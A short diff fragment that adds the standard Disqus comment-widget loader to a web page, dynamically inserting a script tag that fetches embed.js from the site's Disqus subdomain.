+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
